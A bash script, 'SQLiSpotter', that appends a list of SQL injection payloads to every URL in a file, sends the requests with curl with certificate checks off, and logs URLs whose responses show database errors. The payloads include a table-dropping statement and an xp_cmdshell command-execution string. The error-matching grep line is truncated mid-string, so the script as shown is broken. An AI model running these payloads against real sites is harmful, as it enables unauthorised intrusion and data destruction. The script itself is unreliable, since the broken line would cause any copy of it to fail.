#!/bin/bash

# SQLiSpotter - Automated Error-Based SQL Injection Tester
# Usage: ./SQLiSpotter.sh urls.txt

# Check if file was passed as an argument
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <urls_file>"
    exit 1
fi

# File containing URLs
URLS_FILE="$1"

# Array of SQL injection payloads
PAYLOADS=(
    "'"
    "''"
    "' OR '1'='1"
    "' OR 1=1--"
    "' OR 1=1#"
    "' OR 1=1/*"
    "'; EXEC xp_cmdshell('dir'); --"
    "'; DROP TABLE users; --"
    "' OR 'x'='x"
    "' AND id IS NULL; --"
    "' UNION SELECT 1, @@version --"
    "' AND 1=(SELECT COUNT(*) FROM tablenames); --"
)

# Count total number of URLs and payloads for progress calculation
TOTAL_URLS=$(wc -l < "$URLS_FILE")
TOTAL_PAYLOADS=${#PAYLOADS[@]}
TOTAL_TESTS=$((TOTAL_URLS * TOTAL_PAYLOADS))
CURRENT_TEST=0

echo -e " "
# Function to update and display the progress bar
update_progress() {
    local current=$1
    local total=$2
    local progress=$((current * 100 / total))
    echo -ne "\033[0;36mProgress: [" # Start cyan color
    for ((i=0; i<progress/2; i++)); do echo -n "#"; done
    for ((i=progress/2; i<50; i++)); do echo -n "-"; done
    echo -ne "] $progress% \033[0m\r" # End cyan color and reset
}

# Initialize an associative array to store tested endpoints and parameters
declare -A tested_endpoints

# Function to extract the endpoint and parameter name from a URL
# Function to extract the endpoint and parameter name from a URL
extract_endpoint_param() {
    local url="$1"
    # Extract the part of the URL before the '?' (endpoint)
    local endpoint="${url%%\?*}"
    # Extract the parameter name (assuming the parameter is the first in the query string)
    local param_name="${url#*\?}"
    param_name="${param_name%%=*}"
    echo "$endpoint:$param_name"
}

# Initialize counters
total_urls_tested=0
unique_urls_tested=0
urls_skipped=0
sqli_found=0

# Function to print the summary table

# Function to print the summary table in green
print_summary() {
    echo -e "\033[0;32m" # Start green color
    echo "Summary:"
    echo "--------------------------------------------"
    printf "| %-20s | %-1d |\n" "URLs Assessed" $total_urls_tested
    printf "| %-20s | %-1d |\n" "Unique URLs & Params" $unique_urls_tested
    printf "| %-20s | %-1d |\n" "URLs Skipped" $urls_skipped
    echo -e "\033[0;31m" # Start red color
    printf "| %-20s | %-1d |\n" "SQL Injections" $sqli_found
    echo -e "\033[0m" # Reset color to default
    echo "--------------------------------------------"
}

# Updated test_sqli function
test_sqli() {
    local url="$1"
    local endpoint_param=$(extract_endpoint_param "$url")
    total_urls_tested=$((total_urls_tested + 1))

    # Check if this endpoint and parameter have been tested and found vulnerable
    if [[ ${tested_endpoints[$endpoint_param]+_} ]]; then
        urls_skipped=$((urls_skipped + 1))
        return
    fi

    unique_urls_tested=$((unique_urls_tested + 1))
    local skip_remaining_tests=false # Flag to skip remaining tests after finding a vulnerability

    for payload in "${PAYLOADS[@]}"; do
        CURRENT_TEST=$((CURRENT_TEST + 1))
        update_progress $CURRENT_TEST $TOTAL_TESTS

        if ! $skip_remaining_tests; then
            # Encode the payload for use in a URL
            encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote(input()))" <<< "$payload")
            # Append the payload to the URL
            test_url="${url}${encoded_payload}"
            # Fetch the page content
            response=$(curl -s --path-as-is --insecure "$test_url")

            # Check for common SQL error patterns
            if echo "$response" | grep -qiE "sql syntax|sql error|warning: mysql|unclosed quotation|odbc drivers error|invalid query|command not properly ended|oracle error|postgresql erro>
                #echo -e "\n\033[0;31mPotential SQLi:\033[0m $test_url \n"
                echo "$test_url" >> output.txt
                sqli_found=$((sqli_found + 1))
                skip_remaining_tests=true # Skip actual tests for remaining payloads
                tested_endpoints[$endpoint_param]=1 # Mark this endpoint and parameter as tested and vulnerable
            fi
        fi
    done
}

# Main loop to read URLs from the file and test them
while IFS= read -r url; do
    test_sqli "$url"
done < "$URLS_FILE"

# Final progress update to ensure 100% is shown at the end
update_progress $TOTAL_TESTS $TOTAL_TESTS

# Print the summary table
print_summary

echo -e "\033[0;31m" # Start red color
cat output.txt
echo -e "\033[0m" # Reset color to default
